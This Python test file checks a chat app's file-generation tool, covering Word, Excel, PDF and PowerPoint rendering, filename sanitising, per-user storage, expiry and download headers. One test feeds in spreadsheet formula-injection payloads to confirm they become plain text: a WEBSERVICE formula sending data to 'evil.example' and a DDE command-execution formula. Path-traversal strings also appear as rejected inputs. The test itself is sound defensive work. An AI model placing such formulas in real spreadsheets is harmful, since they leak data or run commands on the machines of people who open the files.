"""Erzeugte Dateien: Formate, Ablage, Download, Rechte, Aufräumen, Einbindung in den Chat."""
import asyncio
import io
import json
import os
import sys
import time

import pytest

from app import mdblocks as md
from app import outbox
from app.config import ConfigError, parse_settings
from app.db import Store
from app.ha_tools import ToolError
from app.main import build_ingress_app
from conftest import ADM01, DORA, RAW
from test_background_run import asgi, jget, new_chat, sse


def run(coro):
    return asyncio.run(coro)


# ------------------------------------------------------------------- Namen und Text

def test_clean_name_strips_paths_and_checks_extension():
    assert outbox.clean_name("../../etc/Bericht Q3.docx") == "Bericht Q3.docx"
    assert outbox.clean_name("C:\\Users\\x\\skript.PS1") == "skript.ps1"
    assert outbox.clean_name('a<b>:"c".txt') == "a_b___c_.txt"
    assert outbox.clean_name("Dockerfile") == "Dockerfile"
    for bad in ("", "   ", ".hidden", "noext", "programm.exe", "x.dll", "archiv.zip"):
        with pytest.raises(ToolError):
            outbox.clean_name(bad)


def test_text_files_get_bom_and_line_endings_where_windows_needs_them():
    ps1, mime = outbox.render("hallo.ps1", 'Write-Host "Grüße"')
    assert ps1.startswith(b"\xef\xbb\xbf") and ps1.decode("utf-8-sig").endswith("\n")
    bat, _ = outbox.render("x.bat", "@echo off\necho hi")
    assert bat == b"@echo off\r\necho hi\r\n"
    py, _ = outbox.render("x.py", "print('ä')\r\n")
    assert py == "print('ä')\n".encode()
    csv_data, _ = outbox.render("t.csv", "a;b\n1;2")
    assert csv_data.startswith(b"\xef\xbb\xbf")  # Excel erkennt UTF-8 sonst nicht
    assert outbox.media_type("x.docx").endswith("wordprocessingml.document")


def test_empty_or_huge_content_is_rejected():
    with pytest.raises(ToolError):
        outbox.render("a.txt", "   ")
    with pytest.raises(ToolError):
        outbox.render("a.txt", "x" * (outbox.MAX_CONTENT_CHARS + 1))


# ------------------------------------------------------------------------- Markdown

def test_markdown_blocks():
    blocks = md.parse("# Titel\n\nText mit **fett**, *kursiv* und `code`.\n\n- a\n  - b\n- c\n\n1. eins\n2. zwei\n\n| X | Y |\n|---|---|\n| 1 | 2 |\n\n```py\nprint(1)\n```\n\n> Zitat\n\n---\n")
    kinds = [b[0] for b in blocks]
    assert kinds == ["h", "p", "list", "list", "table", "code", "quote", "hr"]
    assert blocks[1][1] == [("Text mit ", ""), ("fett", "b"), (", ", ""), ("kursiv", "i"), (" und ", ""), ("code", "c"), (".", "")]
    assert blocks[2][2] == [(0, [("a", "")]), (1, [("b", "")]), (0, [("c", "")])] and blocks[2][1] is False
    assert blocks[3][1] is True
    assert md.plain(blocks[4][1][1][0]) == "1" and blocks[5][1] == "print(1)"


def test_inline_links_and_snake_case():
    assert md.plain(md.inline("[Doku](https://x.org) und snake_case_name")) == "Doku (https://x.org) und snake_case_name"


# ----------------------------------------------------------------------------- Word

MD = "# Bericht\n\nHallo **Welt** äöü ß €.\n\n- Punkt eins\n- Punkt zwei\n\n1. Erst\n2. Dann\n\n| Raum | Wert |\n|---|---|\n| Küche | 20 |\n\n```\nGet-Date\n```\n"


def test_docx_roundtrip():
    from docx import Document

    data, mime = outbox.render("bericht.docx", MD)
    doc = Document(io.BytesIO(data))
    texts = [p.text for p in doc.paragraphs]
    assert "Bericht" in texts and "Hallo Welt äöü ß €." in texts
    assert any(t.startswith("•") and "Punkt eins" in t for t in texts)
    assert any(t.startswith("2.") and "Dann" in t for t in texts)
    assert doc.tables[0].cell(1, 0).text == "Küche" and doc.tables[0].cell(0, 1).text == "Wert"
    assert "Get-Date" in texts
    bold = [r for p in doc.paragraphs for r in p.runs if r.text == "Welt"][0]
    assert bold.bold is True
    assert doc.core_properties.title == "bericht"


# ---------------------------------------------------------------------------- Excel

def sheet_values(data):
    from openpyxl import load_workbook

    wb = load_workbook(io.BytesIO(data))
    return {ws.title: [[c.value for c in row] for row in ws.iter_rows()] for ws in wb}


def test_xlsx_from_json_with_formulas_numbers_and_dates():
    content = json.dumps({"sheets": [
        {"name": "Verbrauch", "rows": [["Monat", "kWh", "Summe"], ["Januar", "1.234,5", "=SUM(B2:B3)"], ["Februar", 20, None], ["2026-03-01", "007", "text"]]},
        {"name": "Zweit", "rows": [{"a": 1, "b": "zwei"}, {"a": 3, "b": "vier"}]},
    ]})
    data, _ = outbox.render("v.xlsx", content)
    values = sheet_values(data)
    assert values["Verbrauch"][1] == ["Januar", 1234.5, "=SUM(B2:B3)"]
    assert values["Verbrauch"][2][1] == 20
    assert values["Verbrauch"][3][0].year == 2026 and values["Verbrauch"][3][1] == "007"  # führende Null bleibt Text
    assert values["Zweit"] == [["a", "b"], [1, "zwei"], [3, "vier"]]


def test_xlsx_dangerous_formulas_become_text():
    content = json.dumps([["x"], ['=WEBSERVICE("http://evil.example/?"&A2)'], ["=cmd|' /C calc'!A0"], ["=SUM(1,2)"]])
    data, _ = outbox.render("g.xlsx", content)
    from openpyxl import load_workbook

    ws = load_workbook(io.BytesIO(data)).active
    assert ws["A2"].data_type == "s" and ws["A3"].data_type == "s"
    assert ws["A4"].data_type == "f"


def test_xlsx_from_csv_and_markdown():
    data, _ = outbox.render("t.xlsx", "Name;Wert\nA;1\nB;2,5\n")
    assert sheet_values(data)["Tabelle1"] == [["Name", "Wert"], ["A", 1], ["B", 2.5]]
    data, _ = outbox.render("m.xlsx", "## Heizung\n\n| Raum | Soll |\n|---|---|\n| Bad | 23 |\n\n## Strom\n\n| Monat | kWh |\n|---|---|\n| Mai | 300 |\n")
    values = sheet_values(data)
    assert list(values) == ["Heizung", "Strom"] and values["Strom"][1] == ["Mai", 300]


def test_xlsx_sheet_names_are_valid_and_unique():
    content = json.dumps({"sheets": [{"name": "A/B:C?" + "x" * 40, "rows": [[1]]}, {"name": "A/B:C?" + "x" * 40, "rows": [[2]]}]})
    data, _ = outbox.render("n.xlsx", content)
    names = list(sheet_values(data))
    assert len(names) == 2 and all(len(n) <= 31 and not set(n) & set("[]:*?/\\") for n in names) and names[0] != names[1]


# -------------------------------------------------------------------------------- PDF

def test_pdf_has_text_and_page_numbers():
    from pypdf import PdfReader

    data, mime = outbox.render("b.pdf", MD + "\n" + "Langer Absatz. " * 400)
    assert data.startswith(b"%PDF") and mime == "application/pdf"
    reader = PdfReader(io.BytesIO(data))
    text = "\n".join(page.extract_text() for page in reader.pages)
    assert "Bericht" in text and "äöü" in text and "Küche" in text and "Get-Date" in text
    assert len(reader.pages) >= 2 and "Seite 1" in reader.pages[0].extract_text()


def test_pdf_without_unicode_fonts_falls_back_to_latin1(monkeypatch):
    from pypdf import PdfReader

    monkeypatch.setattr(outbox, "find_fonts", lambda: None)
    data, _ = outbox.render("b.pdf", "# Titel\n\nGrüße – „Test“ … 5 € 😀")
    text = PdfReader(io.BytesIO(data)).pages[0].extract_text()
    assert "Grüße" in text and "EUR" in text


def test_pdf_never_splits_words_between_formats():
    from pypdf import PdfReader

    data, _ = outbox.render("w.pdf", ("wort " * 31) + "`Code` danach")
    text = PdfReader(io.BytesIO(data)).pages[0].extract_text()
    assert "Code" in text.replace("\n", " ") and "Cod\n" not in text


# ------------------------------------------------------------------------------- PowerPoint

def test_pptx_slides_notes_and_pagination():
    from pptx import Presentation

    long_list = "\n".join(f"- Punkt {i} mit einem etwas längeren Text, damit die Folie voll wird und umbrochen werden muss, ja wirklich" for i in range(30))
    content = f"# Titel\nUntertitel\n\n# Ergebnisse\n- A\n- **B**\n  - B1\nNotizen: Das sage ich dazu.\n\n---\n\n# Tabelle\n| X | Y |\n|---|---|\n| 1 | 2 |\n\n# Lang\n{long_list}\n"
    data, mime = outbox.render("d.pptx", content)
    prs = Presentation(io.BytesIO(data))
    slides = list(prs.slides)
    titles = [s.shapes.title.text_frame.text for s in slides]
    assert titles[:3] == ["Titel", "Ergebnisse", "Tabelle"] and any(t == "Lang (Forts.)" for t in titles)
    assert slides[1].notes_slide.notes_text_frame.text == "Das sage ich dazu."
    assert any(shape.has_table for shape in slides[2].shapes)
    assert prs.slide_width > prs.slide_height * 1.7  # 16:9


# --------------------------------------------------------------- fehlende Bibliotheken

def test_missing_library_gives_a_clear_message(monkeypatch):
    monkeypatch.setitem(sys.modules, "docx", None)
    with pytest.raises(ToolError, match="nicht verfügbar"):
        outbox.render("a.docx", "# x")
    assert outbox.render("a.txt", "geht trotzdem")[0] == b"geht trotzdem\n"


def test_library_errors_become_tool_errors(monkeypatch):
    monkeypatch.setattr(outbox, "render_pdf", lambda *a: (_ for _ in ()).throw(RuntimeError("kaputt")))
    with pytest.raises(ToolError, match="PDF-Datei konnte nicht erzeugt werden"):
        outbox.render("a.pdf", "x")


# ------------------------------------------------------------------------------ Ablage

def make_store(tmp_path):
    store = Store(tmp_path / "t.sqlite3")
    store.sync_profiles(["adm01", "dora"])
    return store


def test_store_files_belong_to_their_owner_and_expire(tmp_path):
    store = make_store(tmp_path)
    chat = store.create_chat("adm01", "Chat")["id"]
    meta = store.outfile_add("adm01", chat, "a.txt", "text/plain", b"hallo", 14)
    assert meta["size"] == 5 and store.outfile_usage("adm01") == 5 and store.outfile_usage("dora") == 0
    found = store.outfile_open("adm01", meta["id"])
    assert found and found[1].read_bytes() == b"hallo"
    assert store.outfile_open("dora", meta["id"]) is None  # fremde Datei
    assert store.outfile_open("adm01", "../../etc/passwd") is None
    assert store.outfile_add("adm01", "gibt-es-nicht", "b.txt", "text/plain", b"x", 14) is None
    assert not list(store.files_dir.glob("*.part"))
    with store._lock, store._conn:
        store._conn.execute("UPDATE outfiles SET expires_at = '2000-01-01T00:00:00+00:00'")
    assert store.outfile_open("adm01", meta["id"]) is None
    assert store.outfile_sweep() == 1 and not found[1].exists()


def test_store_sweep_removes_orphans_but_spares_fresh_files(tmp_path):
    store = make_store(tmp_path)
    store.files_dir.mkdir(parents=True)
    old, fresh = store.files_dir / ("a" * 32), store.files_dir / ("b" * 32)
    old.write_bytes(b"x")
    fresh.write_bytes(b"y")
    past = time.time() - 3600
    os.utime(old, (past, past))
    store.outfile_sweep()
    assert not old.exists() and fresh.exists()


def test_deleting_a_chat_deletes_its_files(tmp_path):
    store = make_store(tmp_path)
    chat = store.create_chat("adm01", "Chat")["id"]
    meta = store.outfile_add("adm01", chat, "a.txt", "text/plain", b"hallo", 14)
    path = store.outfile_open("adm01", meta["id"])[1]
    assert store.delete_chat("adm01", chat)
    assert not path.exists() and store.outfile_usage("adm01") == 0


# ---------------------------------------------------------------- Einbindung in die App

def file_app(store, script, **options):
    settings = parse_settings({**RAW, **options}, frozenset({"testclient"}))
    seen = {}

    class ToolBackend:
        async def stream(self, history, message, effort, attachments=None, instructions=None, tools=None, note="", **_):
            seen["tools"] = sorted(t.name for t in tools or [])
            seen["note"] = note
            handlers = {t.name: t.handler for t in tools or []}
            for name, args in script:
                try:
                    seen.setdefault("results", []).append(await handlers[name](args))
                except ToolError as exc:
                    seen.setdefault("results", []).append("FEHLER " + str(exc))
            yield "Fertig."

    return build_ingress_app(settings, store, ToolBackend()), seen


def test_file_create_end_to_end(store):
    async def scenario():
        app, seen = file_app(store, [("file_create", {"name": "bericht.docx", "content": MD}), ("file_create", {"name": "x.exe", "content": "nein"})])
        chat = await new_chat(app)
        out = await asgi(app, "POST", f"/api/chats/{chat}/send", {"content": "Mach ein Dokument"})
        events = sse(out)
        made = [e for e in events if e["type"] == "tool" and e.get("file")]
        assert len(made) == 1 and made[0]["status"] == "ok" and made[0]["kind"] == "file"
        file = made[0]["file"]
        assert file["name"] == "bericht.docx" and file["size"] > 1000
        assert seen["results"][0].startswith("Datei bericht.docx erstellt") and seen["results"][1].startswith("FEHLER")
        assert "file_create" in seen["tools"]

        got = await asgi(app, "GET", f"/api/files/{file['id']}")
        assert got["status"] == 200 and got["body"][:2] == b"PK"
        # Karte bleibt nach dem Neuladen des Chats erhalten
        messages = jget(await asgi(app, "GET", f"/api/chats/{chat}/messages"))
        card = [t for t in messages[-1]["tools"] if t.get("file")][0]["file"]
        assert card == {"id": file["id"], "name": "bericht.docx", "size": file["size"], "gone": False}
        # eine andere Person bekommt die Datei nicht
        assert (await asgi(app, "GET", f"/api/files/{file['id']}", user=DORA))["status"] == 404
        assert (await asgi(app, "GET", "/api/files/nicht-gueltig"))["status"] == 404
        # abgelaufen: Karte zeigt „gone“, Download 404
        with store._lock, store._conn:
            store._conn.execute("UPDATE outfiles SET expires_at = '2000-01-01T00:00:00+00:00'")
        messages = jget(await asgi(app, "GET", f"/api/chats/{chat}/messages"))
        assert [t for t in messages[-1]["tools"] if t.get("file")][0]["file"]["gone"] is True
        assert (await asgi(app, "GET", f"/api/files/{file['id']}"))["status"] == 404

    run(scenario())


def test_download_headers(store):
    async def scenario():
        app, seen = file_app(store, [("file_create", {"name": "Größe & Maß.ps1", "content": "Get-Date"})])
        chat = await new_chat(app)
        events = sse(await asgi(app, "POST", f"/api/chats/{chat}/send", {"content": "Skript"}))
        file = [e["file"] for e in events if e.get("file")][0]
        assert file["name"] == "Größe & Maß.ps1"
        from fastapi.testclient import TestClient

        client = TestClient(app)
        response = client.get(f"/api/files/{file['id']}", headers={"X-Remote-User-Id": ADM01})
        disposition = response.headers["content-disposition"]
        assert disposition.startswith("attachment") and "filename*=utf-8''" in disposition.lower()
        assert "sandbox" in response.headers["content-security-policy"] and response.headers["cache-control"] == "no-store"
        assert response.content.startswith(b"\xef\xbb\xbf")

    run(scenario())


def test_tool_absent_when_disabled(store):
    async def scenario():
        app, seen = file_app(store, [], files_enabled=False)
        await asgi(app, "POST", f"/api/chats/{await new_chat(app)}/send", {"content": "Hi"})
        assert "file_create" not in seen["tools"]
        app, seen = file_app(store, [])
        await asgi(app, "POST", f"/api/chats/{await new_chat(app)}/send", {"content": "Hi"})
        assert "file_create" in seen["tools"]

    run(scenario())


def test_limits_per_answer_and_per_person(store, monkeypatch):
    async def scenario():
        monkeypatch.setattr(outbox, "MAX_PER_RUN", 2)
        script = [("file_create", {"name": f"a{i}.txt", "content": "x"}) for i in range(3)]
        app, seen = file_app(store, script)
        await asgi(app, "POST", f"/api/chats/{await new_chat(app)}/send", {"content": "Hi"})
        assert [r.startswith("Datei") for r in seen["results"]] == [True, True, False] and "höchstens 2" in seen["results"][2]
        monkeypatch.setattr(outbox, "MAX_PROFILE_BYTES", 1)
        app, seen = file_app(store, [("file_create", {"name": "b.txt", "content": "x"})])
        await asgi(app, "POST", f"/api/chats/{await new_chat(app)}/send", {"content": "Hi"})
        assert "Speicher für erzeugte Dateien ist voll" in seen["results"][0]

    run(scenario())


def test_only_file_answer_still_gets_a_text(store):
    """Bleibt die Antwort leer, aber eine Datei ist entstanden, geht die Frage nicht verloren."""
    async def scenario():
        settings = parse_settings(RAW, frozenset({"testclient"}))

        class Silent:
            async def stream(self, history, message, effort, tools=None, **_):
                await {t.name: t.handler for t in tools}["file_create"]({"name": "a.txt", "content": "x"})
                return
                yield

        app = build_ingress_app(settings, store, Silent())
        chat = await new_chat(app)
        events = sse(await asgi(app, "POST", f"/api/chats/{chat}/send", {"content": "Datei"}))
        assert events[-1]["type"] == "done"
        assert len(jget(await asgi(app, "GET", f"/api/chats/{chat}/messages"))) == 2

    run(scenario())


# --------------------------------------------------------------------------- Konfiguration

def test_config_files_options():
    assert parse_settings(RAW, frozenset()).files_keep_days == 14 and parse_settings(RAW, frozenset()).files_enabled
    assert parse_settings({**RAW, "files_keep_days": 30, "files_enabled": False}, frozenset()).files_keep_days == 30
    for bad in (0, 366, "x"):
        with pytest.raises(ConfigError):
            parse_settings({**RAW, "files_keep_days": bad}, frozenset())
